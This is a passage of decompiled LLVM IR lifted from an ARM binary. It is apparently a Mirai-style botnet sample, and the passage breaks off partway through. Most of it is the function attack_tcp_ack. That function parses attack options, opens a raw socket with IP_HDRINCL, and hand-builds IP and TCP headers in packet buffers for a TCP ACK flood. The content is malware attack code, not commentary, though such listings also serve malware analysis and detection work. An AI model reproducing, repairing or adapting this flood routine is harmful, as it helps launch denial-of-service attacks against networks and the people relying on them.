  uselistorder i32 %v6_b80c, { 0, 2, 1, 3 }
  uselistorder i1 %v9_b83c, { 1, 0 }
  uselistorder i32 %v4_b850, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_b798, { 1, 0, 2 }
  uselistorder i32 %v0_b948, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_b788, { 1, 0 }
  uselistorder i1 %v7_b780, { 1, 0, 2 }
  uselistorder i1 %v7_b734, { 1, 0 }
  uselistorder i32 %v3_b730, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_bb10, { 1, 0 }
  uselistorder i32 %v1_baf8, { 1, 0 }
  uselistorder i32 %v1_bae0, { 1, 0 }
  uselistorder i32 %v1_bac8, { 1, 0 }
  uselistorder i32 %v1_bab0, { 1, 0 }
  uselistorder i32 %v3_b848, { 1, 0 }
  uselistorder i1 %v2_b864, { 1, 0 }
  uselistorder i32 %v1_b860, { 1, 0 }
  uselistorder i32 %v4_b85c, { 2, 0, 1 }
  uselistorder i32 %v2_b770, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_b70c, { 1, 0 }
  uselistorder i1 %v7_b704, { 1, 0 }
  uselistorder i1 %v7_b6d8, { 1, 0 }
  uselistorder i32 %v3_b6d4, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_b6c0, { 2, 3, 1, 0 }
  uselistorder i32 %v6_b6a0, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_b688, { 1, 0 }
  uselistorder i32 %v1_b668, { 1, 0 }
  uselistorder i32 %v1_b648, { 1, 0 }
  uselistorder i32 %v1_b628, { 1, 0 }
  uselistorder i32 %v1_b608, { 1, 0 }
  uselistorder i32 %v1_b5e8, { 1, 0 }
  uselistorder i32 %v6_b5c4, { 1, 0 }
  uselistorder i32 %v1_b5ac, { 1, 0 }
  uselistorder i8 %v5_b564, { 1, 0 }
  uselistorder i32 %v6_b544, { 1, 0 }
  uselistorder i32 %v2_b52c, { 0, 3, 1, 2 }
  uselistorder i32 %v2_b51c, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 46, 45, 47, 49, 48, 50, 52, 51, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 6, 9, 8, 11, 10, 16, 12, 13, 14, 15, 19, 17, 18, 21, 20, 22, 25, 24, 23, 26, 27, 28, 30, 31, 29, 32, 34, 33, 35, 36, 37, 39, 38, 40, 42, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 0, 16, 17, 14, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bba8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_bb7c, { 1, 0 }
  uselistorder label %dec_label_pc_bb6c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bb5c, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %dec_label_pc_b8c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b898, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b7d4, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_b7b4, { 1, 0 }
  uselistorder label %dec_label_pc_b790, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_b740, { 1, 0 }
  uselistorder label %dec_label_pc_b724, { 1, 0 }
}

define i32 @attack_tcp_ack(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_bcb4 = load i32, i32* @sb, align 4
  %v24_bcb4 = load i32, i32* @fp, align 4
  %v27_bcb4 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_bcd0 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_bcd4 = load i32, i32* @r5, align 4
  store i32 %v0_bcd4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bce4 = load i32, i32* @r4, align 4
  store i32 %v0_bce4, i32* %r0.global-to-local, align 4
  %v5_bce8 = inttoptr i32 %v0_bcd4 to i32*
  %v6_bce8 = call i32 @attack_get_opt_int(i32 %v0_bce4, i32* %v5_bce8, i32 2, i32 0)
  %v1_bcf4 = urem i32 %v6_bce8, 256
  store i32 %v1_bcf4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_bd00 = load i32, i32* @r5, align 4
  store i32 %v0_bd00, i32* %r1.global-to-local, align 4
  %v0_bd04 = load i32, i32* @r4, align 4
  store i32 %v0_bd04, i32* %r0.global-to-local, align 4
  %v6_bd0c = inttoptr i32 %v0_bd00 to i32*
  %v7_bd0c = call i32 @attack_get_opt_int(i32 %v0_bd04, i32* %v6_bd0c, i32 3, i32 65535)
  %v0_bd10 = load i32, i32* @r5, align 4
  store i32 %v0_bd10, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_bd0c, i32* %sb.global-to-local, align 4
  %v0_bd20 = load i32, i32* @r4, align 4
  store i32 %v0_bd20, i32* %r0.global-to-local, align 4
  %v4_bd24 = inttoptr i32 %v0_bd10 to i32*
  %v5_bd24 = call i32 @attack_get_opt_int(i32 %v0_bd20, i32* %v4_bd24, i32 4, i32 64)
  %v1_bd2c = urem i32 %v5_bd24, 256
  store i32 %v1_bd2c, i32* %ip.global-to-local, align 4
  %v0_bd30 = load i32, i32* @r5, align 4
  store i32 %v0_bd30, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bd3c = load i32, i32* @r4, align 4
  store i32 %v0_bd3c, i32* %r0.global-to-local, align 4
  %v6_bd44 = inttoptr i32 %v0_bd30 to i32*
  %v7_bd44 = call i32 @attack_get_opt_int(i32 %v0_bd3c, i32* %v6_bd44, i32 5, i32 0)
  %v1_bd50 = urem i32 %v7_bd44, 256
  store i32 %v1_bd50, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_bd5c = load i32, i32* @r5, align 4
  store i32 %v0_bd5c, i32* %r1.global-to-local, align 4
  %v0_bd60 = load i32, i32* @r4, align 4
  store i32 %v0_bd60, i32* %r0.global-to-local, align 4
  %v5_bd68 = inttoptr i32 %v0_bd5c to i32*
  %v6_bd68 = call i32 @attack_get_opt_int(i32 %v0_bd60, i32* %v5_bd68, i32 6, i32 65535)
  %v0_bd70 = load i32, i32* @r5, align 4
  store i32 %v0_bd70, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_bd68, i32* @r6, align 4
  %v0_bd80 = load i32, i32* @r4, align 4
  store i32 %v0_bd80, i32* %r0.global-to-local, align 4
  %v4_bd84 = inttoptr i32 %v0_bd70 to i32*
  %v5_bd84 = call i32 @attack_get_opt_int(i32 %v0_bd80, i32* %v4_bd84, i32 7, i32 65535)
  %v0_bd8c = load i32, i32* @r5, align 4
  store i32 %v0_bd8c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_bd84, i32* @sl, align 4
  %v0_bd9c = load i32, i32* @r4, align 4
  store i32 %v0_bd9c, i32* %r0.global-to-local, align 4
  %v4_bda0 = inttoptr i32 %v0_bd8c to i32*
  %v5_bda0 = call i32 @attack_get_opt_int(i32 %v0_bd9c, i32* %v4_bda0, i32 17, i32 65535)
  %v0_bdac = load i32, i32* @r5, align 4
  store i32 %v0_bdac, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_bdb8 = load i32, i32* @r4, align 4
  store i32 %v0_bdb8, i32* %r0.global-to-local, align 4
  %v5_bdbc = inttoptr i32 %v0_bdac to i32*
  %v6_bdbc = call i32 @attack_get_opt_int(i32 %v0_bdb8, i32* %v5_bdbc, i32 18, i32 65535)
  %v0_bdc0 = load i32, i32* @r5, align 4
  store i32 %v0_bdc0, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bdd0 = load i32, i32* @r4, align 4
  store i32 %v0_bdd0, i32* %r0.global-to-local, align 4
  %v5_bdd4 = inttoptr i32 %v0_bdc0 to i32*
  %v6_bdd4 = call i32 @attack_get_opt_int(i32 %v0_bdd0, i32* %v5_bdd4, i32 11, i32 0)
  %v0_bdd8 = load i32, i32* @r5, align 4
  store i32 %v0_bdd8, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bde8 = load i32, i32* @r4, align 4
  store i32 %v0_bde8, i32* %r0.global-to-local, align 4
  %v5_bdec = inttoptr i32 %v0_bdd8 to i32*
  %v6_bdec = call i32 @attack_get_opt_int(i32 %v0_bde8, i32* %v5_bdec, i32 12, i32 1)
  %v0_bdf0 = load i32, i32* @r5, align 4
  store i32 %v0_bdf0, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_be00 = load i32, i32* @r4, align 4
  store i32 %v0_be00, i32* %r0.global-to-local, align 4
  %v5_be04 = inttoptr i32 %v0_bdf0 to i32*
  %v6_be04 = call i32 @attack_get_opt_int(i32 %v0_be00, i32* %v5_be04, i32 13, i32 0)
  %v0_be08 = load i32, i32* @r5, align 4
  store i32 %v0_be08, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_be18 = load i32, i32* @r4, align 4
  store i32 %v0_be18, i32* %r0.global-to-local, align 4
  %v5_be1c = inttoptr i32 %v0_be08 to i32*
  %v6_be1c = call i32 @attack_get_opt_int(i32 %v0_be18, i32* %v5_be1c, i32 14, i32 0)
  %v0_be20 = load i32, i32* @r5, align 4
  store i32 %v0_be20, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_be30 = load i32, i32* @r4, align 4
  store i32 %v0_be30, i32* %r0.global-to-local, align 4
  %v5_be34 = inttoptr i32 %v0_be20 to i32*
  %v6_be34 = call i32 @attack_get_opt_int(i32 %v0_be30, i32* %v5_be34, i32 15, i32 0)
  %v0_be38 = load i32, i32* @r5, align 4
  store i32 %v0_be38, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_be48 = load i32, i32* @r4, align 4
  store i32 %v0_be48, i32* %r0.global-to-local, align 4
  %v5_be4c = inttoptr i32 %v0_be38 to i32*
  %v6_be4c = call i32 @attack_get_opt_int(i32 %v0_be48, i32* %v5_be4c, i32 16, i32 0)
  %v0_be50 = load i32, i32* @r5, align 4
  store i32 %v0_be50, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_be60 = load i32, i32* @r4, align 4
  store i32 %v0_be60, i32* %r0.global-to-local, align 4
  %v5_be64 = inttoptr i32 %v0_be50 to i32*
  %v6_be64 = call i32 @attack_get_opt_int(i32 %v0_be60, i32* %v5_be64, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_be74 = load i32, i32* @r5, align 4
  store i32 %v0_be74, i32* %r1.global-to-local, align 4
  %v0_be78 = load i32, i32* @r4, align 4
  store i32 %v0_be78, i32* %r0.global-to-local, align 4
  %v4_be7c = inttoptr i32 %v0_be74 to i32*
  %v5_be7c = call i32 @attack_get_opt_int(i32 %v0_be78, i32* %v4_be7c, i32 1, i32 1)
  %v2_be88 = load i32, i32* @global_var_26e50.101, align 4
  store i32 %v2_be88, i32* %r3.global-to-local, align 4
  %v1_be8c = urem i32 %v5_be7c, 256
  store i32 %v1_be8c, i32* %ip.global-to-local, align 4
  %v0_be90 = load i32, i32* @r5, align 4
  store i32 %v0_be90, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_be98 = load i32, i32* @r4, align 4
  store i32 %v0_be98, i32* %r0.global-to-local, align 4
  %v5_bea0 = inttoptr i32 %v0_be90 to i32*
  %v6_bea0 = call i32 @attack_get_opt_ip(i32 %v0_be98, i32* %v5_bea0, i32 25, i32 %v2_be88, i32 %v1_be8c)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_beb4 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_beb4, i32* %r0.global-to-local, align 4
  %v7_beb8 = icmp eq i32 %v3_beb4, -1
  store i1 %v7_beb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_beb8, label %dec_label_pc_c380, label %dec_label_pc_bec4

dec_label_pc_bec4:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_becc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_becc, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_bee0 = call i32 @__GI_setsockopt(i32 %v3_beb4, i32 0, i32 3, i32 %v6_becc, i32 4)
  store i32 %v5_bee0, i32* %r0.global-to-local, align 4
  %v7_bee4 = icmp eq i32 %v5_bee0, -1
  store i1 %v7_bee4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bee4, label %dec_label_pc_c378, label %dec_label_pc_beec

dec_label_pc_beec:                                ; preds = %dec_label_pc_bec4
  %v0_beec = load i32, i32* %sb.global-to-local, align 4
  %v3_beec = mul i32 %v0_beec, 65536
  store i32 %v3_beec, i32* @r5, align 4
  %v0_bef0 = load i32, i32* @r6, align 4
  %v0_bef4 = load i32, i32* @sl, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_befc = urem i32 %v0_beec, 65536
  store i32 %v3_befc, i32* %r1.global-to-local, align 4
  %v3_bf00 = urem i32 %v0_bef0, 65536
  store i32 %v3_bf00, i32* %r2.global-to-local, align 4
  %v3_bf04 = urem i32 %v0_bef4, 65536
  store i32 %v3_bf04, i32* %r3.global-to-local, align 4
  %v0_bf08 = load i32, i32* @r7, align 4
  %v2_bf08 = icmp eq i32 %v0_bf08, 0
  store i1 %v2_bf08, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bf08, label %dec_label_pc_c38c, label %dec_label_pc_bf20

dec_label_pc_bf20:                                ; preds = %dec_label_pc_beec
  %v3_bf24 = mul i32 %v6_be64, 65536
  %v1_bf28 = add i32 %v3_bf24, 2621440
  store i32 %v1_bf28, i32* @lr, align 4
  %tmp59 = mul i32 %v0_bef0, 256
  %v3_bf4c = and i32 %tmp59, 65280
  %tmp60 = mul i32 %v0_bef4, 256
  %v3_bf50 = and i32 %tmp60, 65280
  %tmp61 = udiv i32 %v0_bef0, 256
  %v4_bf54 = urem i32 %tmp61, 256
  %v5_bf54 = or i32 %v4_bf54, %v3_bf4c
  store i32 %v5_bf54, i32* @r6, align 4
  %tmp62 = udiv i32 %v0_bef4, 256
  %v4_bf58 = urem i32 %tmp62, 256
  %v5_bf58 = or i32 %v4_bf58, %v3_bf50
  store i32 %v5_bf58, i32* @sl, align 4
  %tmp63 = udiv i32 %v1_bf28, 256
  %v3_bf6c = and i32 %tmp63, 65280
  %tmp64 = mul i32 %v0_beec, 256
  %v3_bf70 = and i32 %tmp64, 65280
  %tmp65 = mul i32 %v5_bda0, 256
  %v3_bf74 = and i32 %tmp65, 65280
  %v1_bf78 = urem i32 %v6_bdd4, 2
  %v1_bf7c = urem i32 %v6_bdec, 2
  %tmp66 = udiv i32 %v5_bda0, 256
  %v4_bf80 = urem i32 %tmp66, 256
  %v5_bf80 = or i32 %v4_bf80, %v3_bf74
  %v4_bf84 = udiv i32 %v1_bf28, 16777216
  %v5_bf84 = or i32 %v3_bf6c, %v4_bf84
  store i32 %v5_bf84, i32* @sb, align 4
  %tmp67 = udiv i32 %v0_beec, 256
  %v4_bf88 = urem i32 %tmp67, 256
  %v5_bf88 = or i32 %v4_bf88, %v3_bf70
  store i32 %v5_bf88, i32* @fp, align 4
  %v1_bfa4 = urem i32 %v6_be04, 2
  store i32 %v1_bfa4, i32* %r2.global-to-local, align 4
  %v1_bfa8 = urem i32 %v6_be1c, 2
  store i32 %v1_bfa8, i32* %r3.global-to-local, align 4
  %v1_bfac = urem i32 %v6_be34, 2
  store i32 %v1_bfac, i32* %ip.global-to-local, align 4
  %v1_bfb0 = urem i32 %v6_be4c, 2
  store i32 %v1_bfb0, i32* %r0.global-to-local, align 4
  %v1_bfb4 = urem i32 %v6_be04, 256
  store i32 %v1_bfb4, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %sext = mul i32 %v6_bce8, 16777216
  %v4_c028 = sdiv i32 %sext, 16777216
  %sext3 = mul i32 %v5_bd24, 16777216
  %v4_c034 = sdiv i32 %sext3, 16777216
  %tmp = sub nsw i32 0, %v1_bf7c
  %v4_c0a0 = and i32 %tmp, 16
  %tmp72 = sub nsw i32 0, %v1_bfa4
  %v4_c0bc = and i32 %tmp72, 8
  %tmp73 = sub nsw i32 0, %v1_bfa8
  %v4_c0d0 = and i32 %tmp73, 4
  %tmp74 = sub nsw i32 0, %v1_bfac
  %v3_c0e4 = and i32 %tmp74, 2
  %v2_c108 = icmp eq i32 %v1_bfb4, 0
  %v1_c030 = trunc i32 %v4_c028 to i8
  %extract.t = trunc i32 %v4_c034 to i8
  br label %dec_label_pc_bfd4

dec_label_pc_bfd4:                                ; preds = %bb70, %dec_label_pc_bf20
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_bfe0 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_bfe0, i32* %r0.global-to-local, align 4
  %v2_bfe8 = load i32, i32* @r4, align 4
  %v5_bfe8 = mul i32 %v2_bfe8, 4
  %v6_bfe8 = add i32 %v5_bfe8, %v2_bcd0
  %v7_bfe8 = inttoptr i32 %v6_bfe8 to i32*
  store i32 %v2_bfe0, i32* %v7_bfe8, align 4
  %v3_bfec = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bfec, i32* %r2.global-to-local, align 4
  %v5_bff4 = mul i32 %v3_bfec, 24
  %v1_bff8 = load i32, i32* @r8, align 4
  %v2_bff8 = add i32 %v1_bff8, %v5_bff4
  store i32 %v2_bff8, i32* %r1.global-to-local, align 4
  store i32 %v2_bcd0, i32* %r3.global-to-local, align 4
  %v4_c000 = mul i32 %v3_bfec, 4
  %v5_c000 = add i32 %v4_c000, %v2_bcd0
  %v6_c000 = inttoptr i32 %v5_c000 to i32*
  %v7_c000 = load i32, i32* %v6_c000, align 4
  store i32 %v7_c000, i32* @r5, align 4
  %v1_c004 = inttoptr i32 %v7_c000 to i8*
  %v2_c004 = load i8, i8* %v1_c004, align 1
  %tmp75 = urem i8 %v2_c004, 16
  %v1_c008 = zext i8 %tmp75 to i32
  %v1_c00c = or i32 %v1_c008, 64
  store i32 %v1_c00c, i32* %r3.global-to-local, align 4
  %v1_c010 = trunc i32 %v1_c00c to i8
  store i8 %v1_c010, i8* %v1_c004, align 1
  %v0_c014 = load i32, i32* @r5, align 4
  %v1_c014 = inttoptr i32 %v0_c014 to i8*
  %v2_c014 = load i8, i8* %v1_c014, align 1
  %v1_c018 = and i8 %v2_c014, -16
  %v1_c01c = or i8 %v1_c018, 5
  store i32 %v1_bd50, i32* %ip.global-to-local, align 4
  store i8 %v1_c01c, i8* %v1_c014, align 1
  store i32 %v4_c028, i32* %r0.global-to-local, align 4
  %v0_c02c = load i32, i32* %ip.global-to-local, align 4
  %v2_c02c = icmp eq i32 %v0_c02c, 0
  store i1 %v2_c02c, i1* %cpsr_z.global-to-local, align 1
  %v2_c030 = load i32, i32* @r5, align 4
  %v3_c030 = add i32 %v2_c030, 1
  %v4_c030 = inttoptr i32 %v3_c030 to i8*
  store i8 %v1_c030, i8* %v4_c030, align 1
  store i32 %v4_c034, i32* %r2.global-to-local, align 4
  %v0_c038 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c038, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_bfd4
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_c03c = load i32, i32* @r5, align 4
  %v4_c03c = add i32 %v3_c03c, 6
  %v5_c03c = inttoptr i32 %v4_c03c to i16*
  store i16 64, i16* %v5_c03c, align 2
  %v0_c044.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t17 = trunc i32 %v0_c044.pre to i8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_bfd4, %bb
  %v0_c044.off0 = phi i8 [ %extract.t, %dec_label_pc_bfd4 ], [ %extract.t17, %bb ]
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_c044 = load i32, i32* @r5, align 4
  %v3_c044 = add i32 %v2_c044, 8
  %v4_c044 = inttoptr i32 %v3_c044 to i8*
  store i8 %v0_c044.off0, i8* %v4_c044, align 1
  %v0_c048 = load i32, i32* %r3.global-to-local, align 4
  %v1_c048 = trunc i32 %v0_c048 to i8
  %v2_c048 = load i32, i32* @r5, align 4
  %v3_c048 = add i32 %v2_c048, 9
  %v4_c048 = inttoptr i32 %v3_c048 to i8*
  store i8 %v1_c048, i8* %v4_c048, align 1
  store i32 %v6_bea0, i32* %ip.global-to-local, align 4
  %v1_c050 = load i32, i32* @r5, align 4
  %v2_c050 = add i32 %v1_c050, 12
  %v3_c050 = inttoptr i32 %v2_c050 to i32*
  store i32 %v6_bea0, i32* %v3_c050, align 4
  %v0_c054 = load i32, i32* %r1.global-to-local, align 4
  %v1_c054 = add i32 %v0_c054, 16
  %v2_c054 = inttoptr i32 %v1_c054 to i32*
  %v3_c054 = load i32, i32* %v2_c054, align 4
  store i32 %v3_c054, i32* %r3.global-to-local, align 4
  %v0_c058 = load i32, i32* @sb, align 4
  %v1_c058 = trunc i32 %v0_c058 to i16
  %v2_c058 = load i32, i32* @r5, align 4
  %v3_c058 = add i32 %v2_c058, 2
  %v4_c058 = inttoptr i32 %v3_c058 to i16*
  store i16 %v1_c058, i16* %v4_c058, align 2
  %v0_c05c = load i32, i32* @fp, align 4
  %v1_c05c = trunc i32 %v0_c05c to i16
  %v2_c05c = load i32, i32* @r5, align 4
  %v3_c05c = add i32 %v2_c05c, 4
  %v4_c05c = inttoptr i32 %v3_c05c to i16*
  store i16 %v1_c05c, i16* %v4_c05c, align 2
  %v0_c060 = load i32, i32* %r3.global-to-local, align 4
  %v1_c060 = load i32, i32* @r5, align 4
  %v2_c060 = add i32 %v1_c060, 16
  %v3_c060 = inttoptr i32 %v2_c060 to i32*
  store i32 %v0_c060, i32* %v3_c060, align 4
  %v0_c064 = load i32, i32* @r6, align 4
  %v1_c064 = trunc i32 %v0_c064 to i16
  %v2_c064 = load i32, i32* @r5, align 4
  %v3_c064 = add i32 %v2_c064, 20
  %v4_c064 = inttoptr i32 %v3_c064 to i16*
  store i16 %v1_c064, i16* %v4_c064, align 2
  %v0_c068 = load i32, i32* @r5, align 4
  %v1_c068 = add i32 %v0_c068, 20
  store i32 %v1_c068, i32* @r4, align 4
  %v1_c06c = add i32 %v0_c068, 32
  %v2_c06c = inttoptr i32 %v1_c06c to i8*
  %v3_c06c = load i8, i8* %v2_c06c, align 1
  %v4_c06c = zext i8 %v3_c06c to i32
  store i32 %v4_c06c, i32* %r3.global-to-local, align 4
  %v1_c070 = add i32 %v0_c068, 33
  %v2_c070 = inttoptr i32 %v1_c070 to i8*
  %v3_c070 = load i8, i8* %v2_c070, align 1
  %v4_c070 = zext i8 %v3_c070 to i32
  store i32 %v1_bf78, i32* %r0.global-to-local, align 4
  %tmp76 = urem i8 %v3_c06c, 16
  %v1_c078 = zext i8 %tmp76 to i32
  %v1_c07c = or i32 %v1_c078, 80
  store i32 %v1_c07c, i32* %r3.global-to-local, align 4
  %v1_c080 = and i32 %v4_c070, 223
  store i32 %v1_c080, i32* %r2.global-to-local, align 4
  %v1_c084 = trunc i32 %v1_c07c to i8
  store i8 %v1_c084, i8* %v2_c06c, align 1
  %v0_c088 = load i32, i32* %r2.global-to-local, align 4
  %v1_c088 = load i32, i32* %r0.global-to-local, align 4
  %v4_c088 = mul i32 %v1_c088, 32
  %v5_c088 = or i32 %v4_c088, %v0_c088
  store i32 %v5_c088, i32* %r2.global-to-local, align 4
  store i32 %v5_bf80, i32* %r1.global-to-local, align 4
  %v1_c090 = trunc i32 %v5_c088 to i8
  %v2_c090 = load i32, i32* @r4, align 4
  %v3_c090 = add i32 %v2_c090, 13
  %v4_c090 = inttoptr i32 %v3_c090 to i8*
  store i8 %v1_c090, i8* %v4_c090, align 1
  %v0_c094 = load i32, i32* @r4, align 4
  %v1_c094 = add i32 %v0_c094, 13
  %v2_c094 = inttoptr i32 %v1_c094 to i8*
  %v3_c094 = load i8, i8* %v2_c094, align 1
  %v4_c094 = zext i8 %v3_c094 to i32
  store i32 %v1_bf7c, i32* %r2.global-to-local, align 4
  %v1_c09c = and i32 %v4_c094, 239
  %v5_c0a0 = or i32 %v1_c09c, %v4_c0a0
  store i32 %v5_c0a0, i32* %r3.global-to-local, align 4
  %v0_c0a4 = load i32, i32* %r1.global-to-local, align 4
  %v2_c0a4 = add i32 %v0_c094, 4
  %v3_c0a4 = inttoptr i32 %v2_c0a4 to i32*
  store i32 %v0_c0a4, i32* %v3_c0a4, align 4
  %v0_c0a8 = load i32, i32* @sl, align 4
  %v1_c0a8 = trunc i32 %v0_c0a8 to i16
  %v2_c0a8 = load i32, i32* @r4, align 4
  %v3_c0a8 = add i32 %v2_c0a8, 2
  %v4_c0a8 = inttoptr i32 %v3_c0a8 to i16*
  store i16 %v1_c0a8, i16* %v4_c0a8, align 2
  %v0_c0ac = load i32, i32* %r3.global-to-local, align 4
  %v1_c0ac = trunc i32 %v0_c0ac to i8
  %v2_c0ac = load i32, i32* @r4, align 4
  %v3_c0ac = add i32 %v2_c0ac, 13
  %v4_c0ac = inttoptr i32 %v3_c0ac to i8*
  store i8 %v1_c0ac, i8* %v4_c0ac, align 1
  %v0_c0b0 = load i32, i32* @r4, align 4
  %v1_c0b0 = add i32 %v0_c0b0, 13
  %v2_c0b0 = inttoptr i32 %v1_c0b0 to i8*
  %v3_c0b0 = load i8, i8* %v2_c0b0, align 1
  %v4_c0b0 = zext i8 %v3_c0b0 to i32
